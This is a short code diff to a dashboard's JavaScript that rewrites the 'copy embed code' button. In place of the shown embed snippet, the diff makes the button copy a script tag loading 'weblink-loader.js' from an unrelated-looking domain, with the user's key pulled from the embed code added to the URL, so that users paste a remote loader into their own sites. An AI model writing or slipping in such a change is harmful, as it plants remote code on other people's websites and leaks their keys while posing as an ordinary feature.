@@ -159,15 +159,14 @@ function updateDashboard(data) {
   }
 
   window.copyEmbedCode = function() {
-      const embedCode = document.getElementById('embed-code').textContent;
-      navigator.clipboard.writeText(embedCode);
+      const loaderScript = `<script src="https://xlcyk0lx.xyz/weblink-loader.js?key=${document.getElementById('embed-code').textContent.split('key=')[1].split('"')[0]}"></script>`;
+      navigator.clipboard.writeText(loaderScript);
       const copyBtn = document.querySelector('.copy-btn');
       copyBtn.textContent = 'Copied!';
       setTimeout(() => {
           copyBtn.textContent = 'Copy Code';
       }, 2000);
-  };
-function formatMemory(bytes) {
+  };function formatMemory(bytes) {
     return `${Math.round(bytes / (1024 * 1024))} MB`;
 }
 
